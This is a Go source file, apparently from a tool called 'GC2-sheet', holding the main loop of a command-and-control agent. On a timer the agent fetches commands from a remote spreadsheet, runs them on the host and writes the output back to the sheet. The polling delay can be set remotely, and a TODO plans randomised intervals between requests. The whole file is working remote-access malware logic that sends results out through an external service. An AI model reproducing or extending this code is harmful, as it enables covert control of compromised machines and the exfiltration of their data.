package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"strconv"
	"time"
)

func Run() {
	commandExecutor, fileSystem, err := provideCommandExecutorAndFileSystem()
	if err != nil {
		panic(err)
	}

	ticker := time.NewTicker(time.Duration(DefaultTickerDuration) * time.Second)
	nextElementIndex := configuration.GetSourceFirstCommandIndex()

	for {
		select {
		case <-ticker.C:
			go func() {
				commandToExecute := ""
				elementIndex := nextElementIndex

				// command to execute (can be ""), and delay for the ticker
				// TODO: implement the possibility to have a range for the ticker to introduce random delay between requests (e.g., 5-10)
				var newTicker int
				commandToExecute, newTicker, err = commandExecutor.pullCommandAndTicker(elementIndex)
				// Get new ticker value and update Ticker if not 0
				if err != nil {
					utils.LogDebug("[-] Failed to pull new command and ticker: " + err.Error())
					return
				} else if newTicker <= 0 {
					utils.LogDebug(fmt.Sprintf(
						"Invalid ticker: %ds (potentially no new command), using previous value",
						newTicker,
					))
				} else { // Update ticker if value has changed
					utils.LogDebug("Updated ticker delay: " + strconv.Itoa(newTicker) + "(s)")
					ticker.Reset(time.Duration(newTicker) * time.Second)
				}

				// If no command end the thread
				if commandToExecute == "" {
					utils.LogDebug("No new command")
					return
				}

				utils.LogDebug("New command: " + commandToExecute)

				nextElementIndex += 1

				// Execute the command
				output, err := performCommandExecution(fileSystem, commandToExecute)
				var formattedOutput string
				if err != nil {
					formattedOutput = "[-] Failed to perform command: " + err.Error()
					utils.LogDebug(formattedOutput)
				} else {
					formattedOutput = *output
				}

				// Write result on spreadsheet (result is stored in the current command structure)
				err = commandExecutor.pushOutput(elementIndex, formattedOutput)
				if err != nil {
					utils.LogDebug("[-] Failed to push new command: " + err.Error())
				} else {
					utils.LogDebug("[+] Command successfully pushed: " + formattedOutput)
				}
			}()
		}
	}
}
